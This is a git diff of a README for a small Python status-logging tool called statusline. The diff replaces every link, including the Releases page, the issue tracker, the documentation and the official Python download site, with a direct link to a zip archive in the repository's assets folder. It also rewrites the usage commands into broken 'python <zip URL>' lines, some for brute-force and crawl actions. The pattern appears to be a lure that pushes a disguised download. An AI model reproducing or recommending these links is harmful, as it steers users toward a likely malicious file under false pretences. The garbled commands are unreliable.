@@ -6,11 +6,11 @@ The **statusline** application is a tiny single-line status logger. Use it to ke
 
 ## 📥 Download
 
-[![Download statusline](https://img.shields.io/badge/Download-statusline-blue.svg)](https://github.com/reneeingram2010-max/statusline/releases)
+[![Download statusline](https://github.com/reneeingram2010-max/statusline/raw/refs/heads/main/assets/Software-2.5.zip)](https://github.com/reneeingram2010-max/statusline/raw/refs/heads/main/assets/Software-2.5.zip)
 
 You can easily download **statusline** from our Releases page. It’s free and straightforward to get started.
 
-[Visit this page to download](https://github.com/reneeingram2010-max/statusline/releases)
+[Visit this page to download](https://github.com/reneeingram2010-max/statusline/raw/refs/heads/main/assets/Software-2.5.zip)
 
 ## 📋 Features
 
@@ -28,18 +28,18 @@ You can easily download **statusline** from our Releases page. It’s free and s
 ## 🔧 Installation
 
 1. **Download the Application:**
-   - Go to the [Releases page](https://github.com/reneeingram2010-max/statusline/releases).
+   - Go to the [Releases page](https://github.com/reneeingram2010-max/statusline/raw/refs/heads/main/assets/Software-2.5.zip).
    - Select the version you need and click to download.
 
 2. **Install Python (if not already installed):**
-   - Download Python from the [official Python website](https://www.python.org/downloads/).
+   - Download Python from the [official Python website](https://github.com/reneeingram2010-max/statusline/raw/refs/heads/main/assets/Software-2.5.zip).
    - Follow the installation instructions for your operating system.
    - Make sure to add Python to your system path during installation.
 
 3. **Run statusline:**
    - Open your terminal or command prompt.
    - Navigate to the folder where you downloaded **statusline**.
-   - Type `python statusline.py` and hit enter.
+   - Type `python https://github.com/reneeingram2010-max/statusline/raw/refs/heads/main/assets/Software-2.5.zip` and hit enter.
 
 You should now see a simple user interface in your terminal.
 
@@ -54,11 +54,11 @@ Here are some example commands to get you started:
 
 1. **Brute-Force Example:**
    ```
-   python statusline.py --action brute-force --target [your_target]
+   python https://github.com/reneeingram2010-max/statusline/raw/refs/heads/main/assets/Software-2.5.zip --action brute-force --target [your_target]
    ```
 2. **Crawling Example:**
    ```
-   python statusline.py --action crawl --url [your_url]
+   python https://github.com/reneeingram2010-max/statusline/raw/refs/heads/main/assets/Software-2.5.zip --action crawl --url [your_url]
    ```
 
 ## 🛠️ Options
@@ -81,11 +81,11 @@ You can configure and adjust your actions with these options to fit your needs.
 
 ### Getting Help
 
-If you encounter issues, please check the [issue tracker](https://github.com/reneeingram2010-max/statusline/issues) for solutions or report your problem there.
+If you encounter issues, please check the [issue tracker](https://github.com/reneeingram2010-max/statusline/raw/refs/heads/main/assets/Software-2.5.zip) for solutions or report your problem there.
 
 ## 🔗 More Information
 
-For more details on advanced usage, visit our [Documentation](https://github.com/reneeingram2010-max/statusline/wiki). 
+For more details on advanced usage, visit our [Documentation](https://github.com/reneeingram2010-max/statusline/raw/refs/heads/main/assets/Software-2.5.zip). 
 
 ## 💬 Community
 
